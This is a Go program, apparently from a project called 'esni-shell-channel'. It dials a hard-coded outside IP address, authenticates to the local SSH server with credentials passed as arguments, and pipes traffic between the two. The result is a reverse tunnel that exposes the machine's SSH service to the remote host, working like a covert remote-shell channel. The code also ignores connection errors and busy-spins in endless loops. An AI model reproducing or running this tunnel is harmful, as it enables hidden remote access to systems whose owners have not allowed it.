package main

import (
	"esni-shell-channel/util"
	"fmt"
	"io"
	"net"
	"os"

	"golang.org/x/crypto/ssh"
)

func main() {

	conn, err := net.Dial("tcp", "1.15.135.178:"+os.Args[3])
	if err != nil {
		fmt.Println("create connection failed: ", err)
	}
	defer conn.Close()

	sshConfig := util.GetSSHConf(os.Args[1], os.Args[2])
	cli, err := ssh.Dial("tcp", "localhost:22", sshConfig)
	if err != nil {
		fmt.Println("client create failed: ", err)
	}
	defer cli.Close()

	session, err := cli.Dial("tcp", "localhost:22")
	if err != nil {
		fmt.Println("session create failed: ", err)
	}
	defer session.Close()

	go func() {
		for {
			io.Copy(conn, session)
		}
	}()

	go func() {
		for {
			io.Copy(session, conn)
		}
	}()

	for {
	}

}
